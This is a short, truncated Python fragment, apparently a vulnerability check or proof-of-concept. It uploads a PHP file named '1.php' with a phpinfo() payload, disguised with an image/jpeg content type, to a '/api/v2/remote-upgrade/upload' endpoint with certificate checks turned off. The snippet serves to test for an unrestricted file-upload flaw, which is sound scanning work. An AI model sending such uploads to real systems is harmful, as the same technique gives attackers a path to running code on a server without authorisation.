...
def check(target):
    ...
    p_target = target
    target = target+'/api/v2/remote-upgrade/upload'
    headers = {
    ...
    file_concent = '<?php phpinfo(); ?>'
    files = {
        'file': ('1.php',file_concent, 'image/jpeg')
    }

    try:
        response = requests.post(target, headers=headers, files=files,verify=False,timeout=5)
        text = response.text
